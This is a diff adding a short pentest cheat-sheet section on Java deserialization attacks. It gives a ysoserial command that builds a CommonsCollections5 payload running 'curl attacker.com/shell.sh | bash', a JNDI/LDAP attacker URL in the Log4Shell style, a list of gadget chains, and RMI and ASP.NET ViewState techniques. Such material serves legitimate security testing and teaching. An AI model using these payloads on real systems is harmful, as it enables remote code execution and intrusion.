@@ -1,0 +1,22 @@
+**Phase 2: Java Deserialization**
+- **Detection**:
+  - Send `rO0AB` (empty object) → observe error/behavior
+  - Use `ysoserial` payloads for testing
+- **Exploitation with ysoserial**:
+  ```bash
+  # Generate payload
+  java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/shell.sh | bash' | base64 -w0
+  
+  # Common gadget chains:
+  # CommonsCollections1-10, Spring1-2, Hibernate1-2, Jdk7u21, Jdk8u20
+  # Jackson, Groovy1, BeanShell1, Clojure, ROME
+  ```
+- **JNDI/LDAP/RMI Exploitation** (Log4Shell style):
+  - `ldap://attacker.com/Exploit`
+  - Requires `com.sun.jndi.ldap.object.trustURLCodebase=true`
+- **RMI/JRMP**:
+  - `ysoserial JRMPClient` / `JRMPListener`
+- **ViewState (ASP.NET)**:
+  - `ViewState` parameter with `__VIEWSTATE`
+  - Requires `machineKey` for signing/encryption
+  - Use `ysoserial.net` for .NET payloads
